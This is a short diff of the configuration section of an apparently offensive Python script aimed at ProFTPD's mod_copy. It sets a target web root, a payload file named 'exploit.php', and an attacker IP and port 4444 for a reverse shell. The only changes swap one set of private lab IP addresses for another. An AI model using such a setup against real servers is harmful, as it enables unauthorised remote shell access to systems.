@@ -4,9 +4,9 @@ import ftplib
 import os
 
 # -------- Configuration --------
-TARGET_FTP_IP = "10.0.2.7"        # Target FTP server (ProFTPD with mod_copy enabled)
+TARGET_FTP_IP = "192.168.8.160"        # Target FTP server (ProFTPD with mod_copy enabled)
 TARGET_WEB_PATH = "/var/www/html" # Web root where PHP file will be placed
-ATTACKER_IP = "10.0.2.5"          # Attacker's machine IP (Kali)
+ATTACKER_IP = "192.168.8.152"          # Attacker's machine IP (Kali)
 ATTACKER_PORT = 4444              # Port to receive reverse shell
 PHP_FILE_NAME = "exploit.php"     # Name of the uploaded payload
 FTP_PORT = 21                     # Default FTP port
